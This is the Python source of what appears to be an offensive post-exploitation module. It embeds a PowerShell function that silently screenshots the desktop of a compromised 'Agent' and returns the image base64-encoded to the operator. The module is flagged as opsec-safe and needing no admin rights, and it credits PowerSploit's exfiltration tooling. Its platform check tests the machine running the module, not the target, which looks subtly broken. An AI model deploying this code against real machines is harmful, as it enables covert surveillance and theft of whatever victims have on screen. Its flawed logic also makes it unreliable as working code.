import platform
import subprocess

class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Get-Screenshot',
            'Author': ['@obscuresec', '@harmj0y'],
            'Description': ('Takes a screenshot of the current desktop and '
                            'returns the output as a .PNG or .JPG.'),
            'Background': False,
            'OutputExtension': 'png',
            'NeedsAdmin': False,
            'OpsecSafe': True,
            'Language': 'powershell',
            'MinLanguageVersion': '2',
            'Comments': ['https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-TimedScreenshot.ps1']
        }

        # Options
        self.options = {
            'Agent': {
                'Description': 'Agent to run module on.',
                'Required': True,
                'Value': ''
            },
            'Ratio': {
                'Description': "JPEG Compression ratio: 1 to 100.",
                'Required': False,
                'Value': ''
            }
        }

        self.mainMenu = mainMenu

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = ""

        # Check if the platform is Windows and x86
        if platform.system().lower() == 'windows' and platform.architecture()[0] == '32bit':
            script = self.generate_x86_script()
        else:
            raise Exception("This module is designed to work only on 32-bit Windows.")

        return script

    def generate_x86_script(self):
        script = """
function Get-Screenshot 
{
    param
    (
        [Parameter(Mandatory = $False)]
        [string]
        $Ratio
    )
    Add-Type -Assembly System.Windows.Forms;
    $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen;
    $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height;
    $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject);
    $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size);
    $DrawingGraphics.Dispose();
    $ms = New-Object System.IO.MemoryStream;
    if ($Ratio) {
            try {
                    $iQual = [convert]::ToInt32($Ratio);
            } catch {
                    $iQual=80;
            }
            if ($iQual -gt 100){
                    $iQual=100;
            } elseif ($iQual -lt 1){
                    $iQual=1;
            }
            $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters;
            $encoderParams.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, $iQual);
            $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatDescription -eq "JPEG" }
            $ScreenshotObject.save($ms, $jpegCodec, $encoderParams);
    } else {
            $ScreenshotObject.save($ms, [Drawing.Imaging.ImageFormat]::Png);
    }
    $ScreenshotObject.Dispose();
    [convert]::ToBase64String($ms.ToArray());
}
Get-Screenshot
"""
        return script